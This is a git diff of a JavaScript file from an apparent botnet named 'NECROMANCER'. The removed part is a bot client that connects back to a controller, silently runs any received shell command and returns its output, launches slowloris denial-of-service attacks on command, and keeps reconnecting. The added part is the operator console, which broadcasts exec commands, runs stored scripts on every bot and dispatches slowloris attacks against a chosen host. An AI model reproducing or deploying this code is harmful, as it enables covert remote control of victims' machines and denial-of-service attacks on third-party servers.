@@ -1,85 +1,130 @@
-import net from "net";
-import util from "util";
-import child_process from "child_process";
-import process from "process";
-import dotenv from "dotenv";
-import changeDir from "./shell.js";
-import slowLoris from "./attacks/slowloris.js";
+import readline from "readline";
+import fs from "fs";
+import { clientModules, broadcast } from "./server.js";
+import help from "./help.json" assert { type: "json" };
 
-dotenv.config({ path: "../config/.env" });
+const rl = readline.createInterface({
+	input: process.stdin,
+	output: process.stdout,
+});
 
-const exec = util.promisify(child_process.exec);
-let path = process.cwd();
+export function prompt() {
+	rl.question("\x1b[31m[NECROMANCER]\x1b[0m ", (message) => {
+		message = message.toLowerCase();
 
-const PORT = process.env.PORT;
-const IP = process.env.IP;
+		// Commands
+		if (message.startsWith("instances")) {
+			if (message === "instances") {
+				console.log(
+					`Instances: ${clientModules.clientInstances.length}`
+				);
+			} else if (message.split(" ")[1] <= clientModules.clients.length) {
+				clientModules.clientInstances = [...clientModules.clients];
+				clientModules.clientInstances =
+					clientModules.clientInstances.slice(
+						0,
+						message.split(" ")[1]
+					);
+			}
+		}
 
-export const client = new net.Socket();
-let intervalConnect = false;
+		if (message.split(" ")[1] === "all")
+			clientModules.clientInstances = [...clientModules.clients];
 
-function connect() {
-	client.connect({
-		port: PORT,
-		host: IP,
+		if (message.startsWith("help")) {
+			if (message === "help") {
+				console.log("Commands:");
+				for (let i = 0; i < help.length; i++) {
+					console.log(help[i].command);
+				}
+			} else if (
+				help.filter((i) => i.command === message.split(" ")[1]).length >
+				0
+			) {
+				let commandIndex = help
+					.map((i) => i.command)
+					.indexOf(message.split(" ")[1]);
+
+				console.log(
+					`Functionality: ${help[commandIndex].functionality}\nUsage: ${help[commandIndex].usage}`
+				);
+			}
+		}
+
+		if (message.startsWith("silent")) {
+			if (message === "silent")
+				console.log(`silent: ${clientModules.silent}`);
+			else if (message.split(" ")[1] === "true") {
+				clientModules.silent = true;
+			} else {
+				clientModules.silent = false;
+			}
+		}
+
+		if (message === "clear") console.clear();
+
+		// Scripts and attacks
+		if (message === "scripts") {
+			listScripts();
+		}
+
+		if (message.startsWith("run")) {
+			runScript(message.split(" ")[1]);
+		}
+
+		if (message.startsWith("slowloris")) {
+			if (message === "slowloris") {
+				console.log(
+					"Please provide arguments: slowloris (host) (port) (duration ms) (sockets)"
+				);
+			} else if (message.split(" ")[1] !== undefined) {
+				broadcast(message);
+				console.log(` Attack sent!`);
+			}
+
+			let duration = message.split(" ")[3];
+
+			if (message.split(" ")[3] === undefined) {
+				duration = 60000;
+			}
+
+			setTimeout(() => {
+				console.log("Attack completed!");
+			}, duration);
+		}
+
+		if (message.startsWith("exec")) broadcast(message);
+
+		return prompt();
 	});
 }
 
-function launchIntervalConnect() {
-	if (false != intervalConnect) return;
-	intervalConnect = setInterval(connect, 5000);
+const scriptsDir = "../config/scripts";
+
+function listScripts() {
+	fs.readdir(scriptsDir, (err, files) => {
+		console.log("\nList of scripts in script dir:");
+		files.forEach((file) => {
+			if (file !== "convert.ps1") console.log(`\x1b[34m${file}\x1b[0m`);
+		});
+		prompt();
+	});
 }
 
-function clearIntervalConnect() {
-	if (false == intervalConnect) return;
-	clearInterval(intervalConnect);
-	intervalConnect = false;
-}
-
-client.on("data", (data) => {
-	const dataStr = data.toString();
-
-	async function execute(command) {
-		await exec(
-			command,
-			{ cwd: path, windowsHide: true },
-			(e, stdout, stderr) => {
-				client.write(`${stdout}\n`);
+function runScript(scriptName) {
+	fs.readdir(scriptsDir, (err, files) => {
+		files.forEach((file) => {
+			if (file === scriptName) {
+				fs.readFile(
+					`${scriptsDir}/${scriptName}`,
+					"utf8",
+					(err, data) => {
+						console.log("\x1b[91mRunning script...\x1b[0m");
+						broadcast(`exec ${data}`);
+					}
+				);
 			}
-		);
-	}
-
-	if (dataStr.startsWith("exec")) {
-		if (dataStr.split(" ")[1] === "cd") {
-			path = changeDir(data, path);
-		}
-		execute(dataStr.replace("exec", ""));
-	}
-
-	if (dataStr.startsWith("slowloris")) {
-		if (dataStr.split(" ")[1] !== undefined) {
-			if (dataStr.split(" ")[3] === undefined)
-				dataStr.split(" ")[3] = "60000";
-			if (dataStr.split(" ")[4] === undefined)
-				dataStr.split(" ")[4] = "10";
-			slowLoris(
-				dataStr.split(" ")[1],
-				dataStr.split(" ")[2],
-				dataStr.split(" ")[3],
-				dataStr.split(" ")[4]
-			);
-		}
-	}
-});
-
-client.on("connect", () => {
-	clearIntervalConnect();
-	client.write("CLIENT connected");
-});
-
-client.on("error", (err) => {
-	launchIntervalConnect();
-});
-client.on("close", launchIntervalConnect);
-client.on("end", launchIntervalConnect);
-
-connect();
+		});
+		prompt();
+	});
+}
